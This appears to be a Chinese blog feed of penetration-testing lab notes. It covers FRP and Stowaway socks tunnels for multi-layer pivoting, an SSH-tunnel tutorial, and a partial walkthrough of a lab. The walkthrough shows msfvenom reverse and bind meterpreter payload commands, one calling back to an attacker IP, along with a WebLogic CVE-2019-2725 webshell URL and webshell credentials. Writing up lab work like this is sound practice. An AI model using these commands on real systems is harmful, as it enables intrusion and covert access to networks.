plaintext"><table><tr><td class="code"><pre><span class="line">http://218.76.8.99:38080/sh/xxx?ver=aaaaaa</span><br><span class="line">pwd：2zhl</span><br><span class="line">连接类型：CUSTOM（自定义类型）</span><br><span class="line">请求信息：（header）注意要带上请求头</span><br><span class="line">Accept-Header</span><br><span class="line">thisIsMyJob!@</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210237704.png" alt="image-20220921023717454"></p><p>正常连接并执行命令：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210238087.png" alt="image-20220921023748386"></p><h2 id="FRP建立Socks代理"><a href="#FRP建立Socks代理" class="headerlink" title="FRP建立Socks代理"></a>FRP建立Socks代理</h2><ul><li>1.VPS：124.233.217.243</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line"></span><br><span class="line">              ./frps   s表示服务端</span><br><span class="line">                                    ./frpc   c表示客户端</span><br><span class="line">                                    -c       指定配置文件</span><br><span class="line">默认frps启动在7000端口，如果要修改启动端口就-c指定配置文件</span><br><span class="line">先要修改配置</span><br><span class="line">cat frps_vps.ini</span><br><span class="line">[common]                 =====&gt;[]内的是注释内容 不会生效</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>2.target1：192.168.2.151</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc –c frpc_1.ini</span><br><span class="line"> ps -elf |grep frpc查看进程是否启动</span><br><span class="line"> 命令执行完成后，会和我们服务端建立连接</span><br><span class="line"> 并生成socks5代理在10088端口</span><br><span class="line">写入配置文件</span><br><span class="line"></span><br><span class="line">cat frpc_1.ini </span><br><span class="line">[common]           </span><br><span class="line">server_addr = 124.223.217.243</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]        搭建了一个socks5的代理</span><br><span class="line">type = tcp        流量类型是tcp，如果要代理http改为http即可                </span><br><span class="line">plugin = socks5            ，如果要启用socks5代理，就要使用此socks5的插件</span><br><span class="line">remote_port = 10088        即socks代理开启在哪个端口，并注意在sockschains上也要修改对应端口</span><br></pre></td></tr></table></figure><ul><li>2.验证socks代理</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用proxychins连接我们的socks代理之前需要先去配置端口</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">#socks4         127.0.0.1 9050</span><br><span class="line">#socks5         127.0.0.1 1080</span><br><span class="line">socks5          127.0.0.1 10088</span><br><span class="line"></span><br><span class="line">proxychains4 nmap -sT -Pn -T4 -n 192.168.2.242</span><br></pre></td></tr></table></figure><h2 id="FRP建立二层Socks代理"><a href="#FRP建立二层Socks代理" class="headerlink" title="FRP建立二层Socks代理"></a>FRP建立二层Socks代理</h2><p>先要拿下target2的shell，蚁剑</p><p>再搭建二层代理将我们target2的请求转发给target3</p><ul><li>1.VPS：124.223.217.243</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>2.Target1：192.168.2.151</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先杀掉原先的进程</span><br><span class="line">ps -elf |grep frpc</span><br><span class="line">kill id</span><br><span class="line">在target1，要重新启动一个frp，指定新的配置文件如下！</span><br><span class="line">./frpc -c frpc_11.ini</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 124.223.217.243</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10088</span><br><span class="line">plugin = socks5</span><br><span class="line">[socks5_to_3]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 10089</span><br><span class="line">remote_port = 10090</span><br><span class="line"></span><br><span class="line">以上的配置会在服务端启动两个代理服务器，一个在10088端口 一个在10090</span><br><span class="line">在proxychains上，联系target2走10088，联系target3走10090</span><br><span class="line">[socks5_to_2]是到二网段的一个配置，负责沟通VPS与本机target2的联系，与上面的配置实际上是一样的</span><br><span class="line">[socks5_to_3]是到三网段</span><br><span class="line">[socks5_to_3]做的就是一个端口转发的配置</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1            本地</span><br><span class="line">local_port = 10089             告诉我们本地有一个监听端口10089  </span><br><span class="line">remote_port = 10090            告诉我们的VPS要监听一个10090端口</span><br><span class="line">这个地方做的一个事情就是端口转发的事情，将本地10089端口的内容转发到公网10090端口</span><br><span class="line">意思就是我们在公网访问vps的10090就相当于访问内网的10089端口！！！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再开启一个server端，供client端连接，建立socks代理连接</span><br><span class="line">./frps -c frps_1.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>3.Target2：192.168.3.190</li></ul><p>先上传我们的工具frp_win</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_2.ini</span><br><span class="line">tasklist | findstr frpc验证进程</span><br><span class="line">taskkill /pid pid /f强制杀掉一个已存在的进程</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.151</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 10089</span><br></pre></td></tr></table></figure><p>4.验证socks代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -T4 -n 192.168.3.180</span><br></pre></td></tr></table></figure><h1 id="Socks代理实战三-Stowaway"><a href="#Socks代理实战三-Stowaway" class="headerlink" title="Socks代理实战三(Stowaway)"></a>Socks代理实战三(Stowaway)</h1><p>适合多层的网络环境，frp简单一点的还可以，复杂了就不太稳定</p><p>frp文件比较大，通过层层代理传输进动静会比较大，对网络的要求也比较高</p><p>stowaway树状连接节点会方便很多</p><h2 id="Stowaway简介"><a href="#Stowaway简介" class="headerlink" title="Stowaway简介"></a>Stowaway简介</h2><blockquote><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p></blockquote><p>Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具</p><p>用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能</p><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul><li>节点: 指 admin || agent</li><li>主动模式: 指当前操作的节点主动连接另一个节点</li><li>被动模式: 指当前操作的节点监听某个端口，等待另一个节点连接</li><li>上游: 指当前操作的节点与其父节点之间的流量</li><li>下游：指当前操作的节点与其所有子节点之间的流量</li></ul><h2 id="Stowaway使用说明"><a href="#Stowaway使用说明" class="headerlink" title="Stowaway使用说明"></a>Stowaway使用说明</h2><p>Stowaway分为两个角色,分别是：</p><ul><li>admin 渗透测试者使用的主控端</li><li>agent 渗透测试者部署的被控端</li></ul><h3 id="admin"><a href="#admin" class="headerlink" title="-admin"></a>-admin</h3><ul><li>admin 用法：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; ./stowaway_admin -l &lt;port&gt; -s [secret]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --proxy &lt;ip:port&gt; --proxyu [username] --proxyp [password]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --rhostreuse</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --proxy &lt;ip:port&gt; --proxyu [username] --proxyp [password] --rhostreuse</span><br></pre></td></tr></table></figure><ul><li>admin 参数：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l 被动模式下的监听地址 [ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--proxy socks5代理服务器地址</span><br><span class="line">--proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--proxyp socks5代理服务器密码(可选)</span><br><span class="line">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></pre></td></tr></table></figure><ul><li>admin 主 panel 选项：（admin面板，连接后可以执行哪些操作）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(admin) &gt;&gt; help</span><br><span class="line">  help                                          显示帮助信息</span><br><span class="line">  detail                                        展示在线节点的详细信息</span><br><span class="line">  topo                                          展示在线节点的父子关系，拓扑图</span><br><span class="line">  use        &lt;id&gt;                               选择你要使用的目标节点</span><br><span class="line">  exit                                          退出 Stowaway</span><br></pre></td></tr></table></figure><ul><li>admin node panel 选项：(node面板 对node执行的操作）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(node 0) &gt;&gt; help</span><br><span class="line"> help                                            显示帮助信息</span><br><span class="line"> listen                                          开始监听当前节点的端口</span><br><span class="line"> addmemo    &lt;string&gt;                             为当前节点添加备忘录</span><br><span class="line"> delmemo                                         删除当前节点的备忘录</span><br><span class="line"> ssh        &lt;ip:port&gt;                            通过当前节点启动SSH</span><br><span class="line"> shell                                           在当前节点上启动一个交互式shell</span><br><span class="line"> socks      &lt;lport&gt; [username] [pass]            启动一个socks5服务器</span><br><span class="line"> stopsocks                                       关闭socks服务</span><br><span class="line"> connect    &lt;ip:port&gt;                            连接到一个新节点</span><br><span class="line"> sshtunnel  &lt;ip:sshport&gt; &lt;agent port&gt;            使用sshtunnel将节点添加到我们的拓扑结构中</span><br><span class="line"> upload     &lt;local filename&gt; &lt;remote filename&gt;   上传文件到当前节点</span><br><span class="line"> download   &lt;remote filename&gt; &lt;local filename&gt;   从当前节点下载文件</span><br><span class="line"> forward    &lt;lport&gt; &lt;ip:port&gt;                    转发本地端口到特定的远程 ip:port</span><br><span class="line"> stopforward                                     关闭转发服务</span><br><span class="line"> backward    &lt;rport&gt; &lt;lport&gt;                     将远程端口(agent)映射到本地端口(admin)。与forward相反</span><br><span class="line"> stopbackward                                    关闭backward服务</span><br><span class="line"> shutdown                                        终止当前节点</span><br><span class="line"> back                                            返回到父面板</span><br><span class="line"> exit                                            退出Stowaway</span><br></pre></td></tr></table></figure><h3 id="agent"><a href="#agent" class="headerlink" title="-agent"></a>-agent</h3><ul><li>agent 参数:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l 被动模式下的监听地址[ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--proxy socks5代理服务器地址</span><br><span class="line">--proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--proxyp socks5代理服务器密码(可选)</span><br><span class="line">--reconnect 重连时间间隔</span><br><span class="line">--rehost 端口复用时复用的IP地址</span><br><span class="line">--report 端口复用时复用的端口号</span><br><span class="line">--up 上游协议类型,默认为裸TCP流量,可选HTTP</span><br><span class="line">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></pre></td></tr></table></figure><h2 id="建立一层socks代理"><a href="#建立一层socks代理" class="headerlink" title="建立一层socks代理"></a>建立一层socks代理</h2><ul><li>在VPS上开启监听（也可以是target监听，vps用connect命令，主动连接添加节点)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stowaway_admin -l 9999 -s hack</span><br><span class="line">开启监听等待其他节点连接</span><br><span class="line">-l 被动模式下的监听地址 [ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br></pre></td></tr></table></figure><ul><li>Target1</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/stowaway_agent -c 47.101.214.85:9999 -s hack</span><br><span class="line">主动连接admin，连接后target1是node id =0</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">-s 节点通信加密密钥</span><br></pre></td></tr></table></figure><ul><li>进入Target1的node节点，开启socks代理</li></ul><p>注意注意的是，开启的socks代理，虽然是在node节点上执行的命令，但是socks代理是开启在admin机器上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243293.png" alt="image-20220921024307025"></p><ul><li>测试socks代理</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243699.png" alt="image-20220921024315473"></p><h2 id="建立二层socks代理"><a href="#建立二层socks代理" class="headerlink" title="建立二层socks代理"></a>建立二层socks代理</h2><ul><li>首先在 node 0 中开启监听</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">listen        在target1开启监听7070端口，让target2连接上target1，这个命令是在vps上执行的</span><br><span class="line">1</span><br><span class="line">7070        []表示可选，&lt;&gt;表示必选</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243114.png" alt="image-20220921024349881"></p><p>在 Target1 上可以看到 agent 监听了 7070 端口</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244465.png" alt="image-20220921024401182"></p><ul><li>在 Target2 中连接 Target1 监听的 7070 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stowaway_agent -c 192.168.2.151:7070 -s hack</span><br><span class="line">主动连接</span><br><span class="line">use 1</span><br><span class="line">socks 1088           </span><br><span class="line">样开启socks 1088端口，注意注意的是，开启的socks代理，虽然是在node节点上执行的命令，但是socks代理是开启在admin机器上</span><br></pre></td></tr></table></figure><ul><li>admin 接收到新的 node 1 , 进入 node 1 节点开启 socks 代理</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244010.png" alt="image-20220921024419783"></p><ul><li>测试代理</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244486.png" alt="image-20220921024426178"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 内网代理隧道搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> socks5 </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MobaXterm教程</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/MobaXterm%E6%95%99%E7%A8%8B.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/MobaXterm%E6%95%99%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MobaXterm配置SSHTunnel"><a href="#MobaXterm配置SSHTunnel" class="headerlink" title="MobaXterm配置SSHTunnel"></a>MobaXterm配置SSHTunnel</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>我们在使用公有云的时候，不论是安全的原因，还是省钱的原因，都经常只购买一个弹性公网IP。除了绑定公网IP的云服务器可以直接从外网访问外，其它的服务器，要么通过登录公有云提供商的网页控制台，从网页远程登录；要么只有先登录绑定公网IP的服务器，然后再ssh到目标服务上。当然，如果买了堡垒机的土豪除外。<br>以上的两种方法，使用都不怎么方便。其实不论是putty，还是MobaXterm，都提供了SSHTunnel的功能，为我们日常管理，提供了很简便的解决方案。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>菜单Tools——MobaSSHTunnel（port forwarding），出现如下界面：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210142761.png" alt="ssh隧道配置" title="ssh隧道配置"></p></li><li><p>上图的左下角,”My computer with MobaXterm”里, &lt;forward port&gt;填入本地计算机空闲端口, 比如65432</p></li><li><p>上图的右下角,”SSH server”里,需要填入三个信息: &lt;ssh server&gt;填写弹性公网IP, &lt;ssh login&gt;填写绑定公网IP的服务器用于登录的用户名,比如root,&lt;ssh port&gt;里一般填写22, 如果你有修改了sshd监听的端口, 那么就填写修改后的端口</p></li><li><p>上图的右上角,”Remote server”里, &lt;remote server&gt;填写需要登录的服务器的私有ip地址,比如192.168.0.168, &lt;remote port&gt;里一般填写22, 如果你有修改了sshd监听的端口, 那么就填写修改后的端口</p></li><li><p>点击”Save”, SSHTunnel就配置好了</p></li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210142724.png" alt="ssh隧道配置" title="ssh隧道配置"></p><p>如上图, 点击”start&#x2F;stop”的start图标, 输入绑定公网IP的服务器的登录用户名对应的密码, ssh隧道就建立了.<br>接下来,我们新建一个Session,如下图:</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210142692.png" alt="新建session" title="新建session"></p><p>注意红色方框标识出来的部分,”Remote host”必须填写<em>localhost</em>或者<em>127.0.0.1</em>, “Port”必须填写我们在第2步里&lt;forward port&gt;填写的端口.<br>然后就可以跟以前一样正常使用了.</p><p>就相当于走了代理去访问远程的ssh</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer:"></a>refer:</h1><blockquote><p><a href="http://www.fobgavin.com/mobaxterm-instruction-1.html">MobaXterm详细使用教程（一）</a></p><p><a href="https://okrs.gitee.io/blog/2020/04/26/019ssh-tunnel/">MobaXterm配置SSHTunnel</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MobaXterm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场三</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%89.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%89.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><blockquote><p><a href="https://11pmsleep.github.io/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/0x26%20-%20Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98/">0x26 - Socks 代理实战</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试要点</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E7%BB%93.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211812304.png" alt="渗透测试流程"></p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ol><li><p>少用msf17010，动静大，容易把主机打崩，渗透测试尽量要动静小，获取到的主机资产要多，如果直接打崩了就少了个资产。在内网要动静小一点，才能更加的隐蔽</p></li><li><p>内网隧道搭建如果不稳定，就要从msf或者cs的代理转向上传frp或者stowaway进行隧道代理搭建。cs的代理比较少用，老版cs不支持socks5，如果追求稳定还是使用之前学习过的代理工具！！！~~~</p><p>比较推荐的是stowaway</p></li><li><p>上传工具的话。动静还是有的，一些工具需要环境比如python。而且工具容易被杀被检测！有的工具稍微大一点，经过代理上传会导致动静非常大。</p></li><li><p>内网扫描的话fscan不错</p></li><li><p>dirb kali中很好用的一个目录扫描工具</p></li><li><p>尝试学习写漏洞检测脚本</p></li><li><p>GitHub搜poc，学习知识后，要自己输出知识</p></li><li><p>要了解爆出来的漏洞，了解怎么利用，怎么发现，对他先有一个认知，不一定需要一下子就知道底层原理。先了解怎么利用，再决定要不要了解底层原理。一定要自己动手去复现漏洞。历史漏洞主要还是靠我们自主学习。另外，历史漏洞有很多，不求全部掌握，但求掌握最新爆出来的漏洞。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场二</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%BA%8C.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%BA%8C.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">218.76.8.99:2880 --&gt; 10.30.1.164:80</span><br><span class="line">218.76.8.99:2822 --&gt; 10.30.1.125:22</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">外网</span></span><br><span class="line">Attacker_Kali：218.76.8.99:2822</span><br><span class="line">10.30.1.125</span><br><span class="line">192.168.1.181</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">172.26.8.84</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一层</span></span><br><span class="line">WEB-Joomla-Win7：218.76.8.99:2880</span><br><span class="line">10.30.1.140</span><br><span class="line">172.26.8.114</span><br><span class="line">192.168.1.141</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内网</span></span><br><span class="line">域：mingy.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二层</span></span><br><span class="line">域内：Weblogic-wls9-win7</span><br><span class="line">192.168.1.28</span><br><span class="line">10.10.10.105</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">三层</span></span><br><span class="line">域内：PC-Win2012</span><br><span class="line">10.10.10.69</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">10.10.10.249</span></span><br><span class="line">域控：DC-Win2012</span><br><span class="line">10.10.10.6</span><br></pre></td></tr></table></figure><h1 id="Target1-Joomla-RCE"><a href="#Target1-Joomla-RCE" class="headerlink" title="Target1 - Joomla-RCE"></a>Target1 - Joomla-RCE</h1><blockquote><p>指纹识别后，该怎么利用呢？去查找对应版本的历史漏洞</p><blockquote><p><a href="https://www.freebuf.com/sectool/181440.html">JoomScan：一款开源的OWASP Joomla漏洞扫描器</a></p></blockquote></blockquote><h2 id="漏洞利用Getshell"><a href="#漏洞利用Getshell" class="headerlink" title="漏洞利用Getshell"></a>漏洞利用Getshell</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202317804.png" alt="image-20220920231730418" style="zoom: 33%;" /><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.141/configuration.php</span><br><span class="line">http://218.76.8.99:2880/configuration.php</span><br><span class="line"></span><br><span class="line">fmxasmkmvpdyzpntoghnnblyzkimpempkoyuxifwfufsjngruq</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202317501.png" alt="image-20220920231754271" style="zoom:33%;" /><h2 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h2><ol><li>ping</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">chcp 65001&gt;nul</span><br><span class="line">echo 正在扫描。。。。。。</span><br><span class="line">for /L %%P in (1,1,254) do @ping -w 10 -n 1 192.168.1.%%P | findstr TTL= &gt;&gt;ip.txt</span><br><span class="line">echo 扫描结束，按任意键结束窗口！</span><br><span class="line"><span class="meta prompt_">pause&gt;</span><span class="language-bash">nul</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reply from 192.168.1.1: bytes=32 time=1ms TTL=64</span><br><span class="line">Reply from 192.168.1.28: bytes=32 time=2ms TTL=128</span><br><span class="line">Reply from 192.168.1.141: bytes=32 time&lt;1ms TTL=128</span><br><span class="line">Reply from 192.168.1.181: bytes=32 time=1ms TTL=64</span><br></pre></td></tr></table></figure><ol start="2"><li>arp -a</li><li>msf的arp_scanner模块</li><li>nmap</li></ol><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=5555 -f exe -o re_5555.exe</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202336418.png" alt="image-20220920233624212" style="zoom: 33%;" /><h2 id="建立socks代理"><a href="#建立socks代理" class="headerlink" title="建立socks代理"></a>建立socks代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_1.ini</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6001</span><br></pre></td></tr></table></figure><h1 id="Target2-Weblogic-RCE"><a href="#Target2-Weblogic-RCE" class="headerlink" title="Target2 - Weblogic-RCE"></a>Target2 - Weblogic-RCE</h1><blockquote><p>192.168.1.28</p></blockquote><h2 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202338805.png" alt="image-20220920233853605" style="zoom:33%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开放端口：21，80，135，445，3389，7001</span><br><span class="line">7001：weblogic</span><br><span class="line">WebLogic Server 版本: 12.1.3.0.0</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209202339437.png" alt="image-20220920233909264" style="zoom:50%;" /><h2 id="WeblogicScan"><a href="#WeblogicScan" class="headerlink" title="WeblogicScan"></a>WeblogicScan</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210112954.png" alt="image-20220921011253725" style="zoom: 33%;" /><blockquote><p><a href="http://192.168.1.28:7001/_async/AsyncResponseService">http://192.168.1.28:7001/_async/AsyncResponseService</a></p></blockquote><ul><li>CVE-2019-2725</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211706358.png" alt="image-20220921170619138" style="zoom:50%;" /><blockquote><p><a href="http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p></blockquote><p>发现网段： 10.10.10.105</p><h2 id="MSF正向shell"><a href="#MSF正向shell" class="headerlink" title="MSF正向shell"></a>MSF正向shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=8899 -f exe -o bind_8899.exe</span><br></pre></td></tr></table></figure><p>通过获得的外网webshell上传木马exe文件到web服务器根目录。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span 